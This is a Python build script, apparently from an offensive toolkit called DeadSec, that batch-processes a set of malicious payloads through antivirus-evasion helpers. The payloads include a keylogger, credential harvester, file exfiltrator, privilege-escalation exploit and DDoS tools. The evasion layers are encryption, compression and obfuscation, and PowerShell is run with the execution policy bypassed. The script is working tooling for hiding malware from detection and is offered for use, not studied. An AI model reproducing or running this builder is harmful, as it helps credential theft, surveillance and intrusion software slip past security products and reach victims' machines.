#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DeadSec Evaded Payload Builder
Automatically builds AV-evaded versions of all payloads
"""

import os
import sys
import subprocess
import argparse

# Set up proper encoding for Windows
if sys.platform == 'win32':
    import io
    sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8', errors='replace')
    sys.stderr = io.TextIOWrapper(sys.stderr.buffer, encoding='utf-8', errors='replace')
from pathlib import Path
import time

def build_evaded_payloads(technique='full', output_dir='evaded_payloads', quiet=False):
    """Build evaded versions of all payloads"""
    
    if not quiet:
        print("=" * 60)
        print("   DEADSEC // EVADED PAYLOAD BUILDER v2.0")
        print("=" * 60)
        print()
    
    # Create output directory
    os.makedirs(output_dir, exist_ok=True)
    
    # Python payloads to evade
    python_payloads = [
        'python_agent.py',
        'credential_harvester.py',
        'keylogger.py',
        'screenshot_capture.py',
        'network_scanner.py',
        'file_exfiltrator.py',
        'privesc_checker.py',
        'privesc_exploit.py',
        'ddos_attack.py'
    ]
    
    # PowerShell payloads to evade
    ps_payloads = [
        'windows_agent.ps1',
        'windows_credential_harvester.ps1',
        'windows_keylogger.ps1',
        'windows_screenshot.ps1',
        'windows_network_scanner.ps1',
        'windows_file_exfiltrator.ps1',
        'windows_geolocation.ps1',
        'windows_privesc_checker.ps1',
        'windows_privesc_exploit.ps1',
        'windows_ddos.ps1'
    ]
    
    success_count = 0
    fail_count = 0
    
    if not quiet:
        print(f"[*] Building evaded Python payloads using '{technique}' technique...")
        print("-" * 60)
    
    for payload in python_payloads:
        input_path = os.path.join('payloads', payload)
        output_path = os.path.join(output_dir, f'evaded_{payload}')
        
        if os.path.exists(input_path):
            try:
                if not quiet:
                    print(f"[*] Processing: {payload}", end=" ... ")
                
                result = subprocess.run([
                    sys.executable,
                    'payloads/av_evasion.py',
                    '-i', input_path,
                    '-o', output_path,
                    '--technique', technique,
                    '-q'
                ], capture_output=True, text=True)
                
                if result.returncode == 0:
                    if not quiet:
                        print("[PASS]")
                    success_count += 1
                else:
                    if not quiet:
                        print("[FAIL]")
                    fail_count += 1
                    if not quiet and result.stderr:
                        print(f"    Error: {result.stderr}")
            except Exception as e:
                if not quiet:
                    print(f"✗ Error: {e}")
                fail_count += 1
        else:
            if not quiet:
                print(f"[!] Not found: {payload}")
            fail_count += 1
    
    if not quiet:
        print(f"\n[*] Building evaded PowerShell payloads...")
        print("-" * 60)
    
    for payload in ps_payloads:
        input_path = os.path.join('payloads', payload)
        output_path = os.path.join(output_dir, f'evaded_{payload}')
        
        if os.path.exists(input_path):
            try:
                if not quiet:
                    print(f"[*] Processing: {payload}", end=" ... ")
                
                result = subprocess.run([
                    'powershell', '-ExecutionPolicy', 'Bypass', '-Command',
                    f'& .\\payloads\\windows_av_evasion.ps1 -InputFile "{input_path}" -OutputFile "{output_path}" -Technique {technique.capitalize()} -Silent'
                ], capture_output=True, text=True)
                
                if result.returncode == 0 and os.path.exists(output_path):
                    if not quiet:
                        print("✓")
                    success_count += 1
                else:
                    if not quiet:
                        print("✗")
                    fail_count += 1
                    if not quiet and result.stderr:
                        print(f"    Error: {result.stderr}")
            except Exception as e:
                if not quiet:
                    print(f"✗ Error: {e}")
                fail_count += 1
        else:
            if not quiet:
                print(f"[!] Not found: {payload}")
            fail_count += 1
    
    if not quiet:
        print("\n" + "=" * 60)
        print(f"[PASS] Build complete!")
        print(f"[PASS] Success: {success_count} payloads")
        print(f"[FAIL] Failed: {fail_count} payloads")
        print(f"[PASS] Output directory: {output_dir}/")
        print("=" * 60)
    
    return success_count, fail_count

def build_single_payload(input_file, output_file, technique='full', language='auto', quiet=False):
    """Build a single evaded payload"""
    
    if not os.path.exists(input_file):
        print(f"[!] Error: Input file not found: {input_file}")
        return False
    
    # Auto-detect language
    if language == 'auto':
        if input_file.endswith('.py'):
            language = 'python'
        elif input_file.endswith('.ps1'):
            language = 'powershell'
        else:
            print(f"[!] Error: Cannot determine language for {input_file}")
            return False
    
    if not quiet:
        print(f"[*] Building evaded payload...")
        print(f"[*] Input: {input_file}")
        print(f"[*] Output: {output_file}")
        print(f"[*] Technique: {technique}")
        print(f"[*] Language: {language}\n")
    
    try:
        if language == 'python':
            result = subprocess.run([
                sys.executable,
                'payloads/av_evasion.py',
                '-i', input_file,
                '-o', output_file,
                '--technique', technique
            ] + (['-q'] if quiet else []), capture_output=True, text=True)
        else:  # powershell
            result = subprocess.run([
                'powershell', '-ExecutionPolicy', 'Bypass', '-Command',
                f'& .\\payloads\\windows_av_evasion.ps1 -InputFile "{input_file}" -OutputFile "{output_file}" -Technique {technique.capitalize()}' + (' -Silent' if quiet else '')
            ], capture_output=True, text=True)
        
        if result.returncode == 0:
            if not quiet:
                print(f"\n[✓] Success! Evaded payload saved to: {output_file}")
            return True
        else:
            print(f"\n[!] Error building payload:")
            if result.stderr:
                print(result.stderr)
            return False
            
    except Exception as e:
        print(f"\n[!] Error: {e}")
        return False

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description='DeadSec Evaded Payload Builder',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Examples:
  Build all payloads:
    python build_evaded_payload.py
  
  Build all with specific technique:
    python build_evaded_payload.py --technique encrypt
  
  Build single payload:
    python build_evaded_payload.py --single -i payloads/keylogger.py -o evaded.py
  
  Custom output directory:
    python build_evaded_payload.py --output custom_dir/
    
Techniques:
  full       - All evasion layers (recommended)
  encrypt    - Multi-layer encryption
  compress   - Compression
  obfuscate  - String/variable obfuscation
        '''
    )
    
    parser.add_argument('--technique', choices=['encrypt', 'compress', 'obfuscate', 'full'],
                       default='full', help='Evasion technique to apply (default: full)')
    parser.add_argument('--output', default='evaded_payloads', help='Output directory (default: evaded_payloads)')
    parser.add_argument('--single', action='store_true', help='Build single payload instead of all')
    parser.add_argument('-i', '--input', help='Input file (for single payload mode)')
    parser.add_argument('-o', '--out-file', help='Output file (for single payload mode)')
    parser.add_argument('--language', choices=['python', 'powershell', 'auto'], default='auto',
                       help='Language (for single payload mode)')
    parser.add_argument('-q', '--quiet', action='store_true', help='Suppress output messages')
    
    args = parser.parse_args()
    
    if args.single:
        if not args.input or not args.out_file:
            parser.error("--single requires -i/--input and -o/--out-file")
        
        success = build_single_payload(
            args.input, 
            args.out_file, 
            technique=args.technique,
            language=args.language,
            quiet=args.quiet
        )
        sys.exit(0 if success else 1)
    else:
        success, failed = build_evaded_payloads(
            technique=args.technique,
            output_dir=args.output,
            quiet=args.quiet
        )
        sys.exit(0 if failed == 0 else 1)
